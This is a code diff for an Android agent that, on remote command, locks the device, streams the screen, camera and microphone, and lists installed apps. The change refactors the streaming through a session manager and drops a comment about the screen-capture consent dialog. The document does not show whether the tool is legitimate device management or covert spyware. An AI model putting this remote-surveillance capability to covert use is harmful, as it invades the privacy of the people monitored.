@@ -262,19 +262,18 @@ object Agent {
                 val ok = LockAdminReceiver.lockNow(appContext)
                 send("LOCK_RESPONSE", JSONObject().put("ok", ok), msg.optString("request_id"))
             }
-            // Media streams. Screen needs a MediaProjection consent token, so the
-            // agent asks MainActivity to run the system consent dialog first; mic
-            // and camera start directly once their runtime permission is granted.
-            "START_SCREEN" -> { log("START_SCREEN"); ScreenCaptureModule.start(appContext) }
-            "STOP_SCREEN" -> { log("STOP_SCREEN"); ScreenCaptureModule.stop(appContext) }
+            // Media streams — routed through StreamSessionManager for lifecycle
+            // isolation and backpressure. One stream failing cannot crash others.
+            "START_SCREEN" -> { log("START_SCREEN"); StreamSessionManager.startScreen(appContext) }
+            "STOP_SCREEN"  -> { log("STOP_SCREEN");  StreamSessionManager.stopScreen(appContext) }
             "START_CAMERA" -> {
                 val facing = msg.optJSONObject("payload")?.optString("facing", "back") ?: "back"
                 log("START_CAMERA ($facing)")
-                CameraModule.start(appContext, facing)
+                StreamSessionManager.startCamera(appContext, facing)
             }
-            "STOP_CAMERA" -> { log("STOP_CAMERA"); CameraModule.stop() }
-            "START_MIC" -> { log("START_MIC"); MicModule.start(appContext) }
-            "STOP_MIC" -> { log("STOP_MIC"); MicModule.stop() }
+            "STOP_CAMERA" -> { log("STOP_CAMERA"); StreamSessionManager.stopCamera() }
+            "START_MIC"   -> { log("START_MIC");   StreamSessionManager.startMic(appContext) }
+            "STOP_MIC"    -> { log("STOP_MIC");    StreamSessionManager.stopMic() }
             "APPS_REQUEST" -> {
                 log("APPS_REQUEST received")
                 send("APPS_RESPONSE", AppsModule.listApps(appContext), msg.optString("request_id"))
@@ -332,6 +331,7 @@ object Agent {
         send("MIC_CHUNK", JSONObject().apply { put("pcm_b64", pcmB64); put("sample_rate", sampleRate) })
     }
     fun sendStreamStatus(stream: String, state: String) {
+        StreamSessionManager.onStreamStatus(stream, state)
         send("STREAM_STATUS", JSONObject().apply { put("stream", stream); put("state", state) })
     }
 
